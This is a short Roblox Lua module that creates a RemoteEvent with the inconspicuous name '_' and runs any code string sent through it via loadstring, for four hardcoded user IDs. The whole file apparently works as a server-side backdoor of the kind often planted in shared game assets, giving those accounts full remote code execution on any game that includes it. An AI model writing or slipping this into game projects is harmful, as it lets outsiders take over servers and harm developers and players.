local ServerExecutor = {}
local REPS = game:GetService("ReplicatedStorage")

local admins = {
	[4459999803] = true,
	[8264578473] = true,
	[2991784797] = true,
	[1179100886] = true
}

function ServerExecutor.Init()
	local remote = REPS:FindFirstChild("_") or Instance.new("RemoteEvent")
	remote.Name = "_"
	remote.Parent = REPS

	remote.OnServerEvent:Connect(function(player, cmd)
		if not admins[player.UserId] then return end
		if type(cmd) ~= "string" then return end

		local func = loadstring(cmd)
		if func then
			pcall(func)
		end
	end)
end

return ServerExecutor
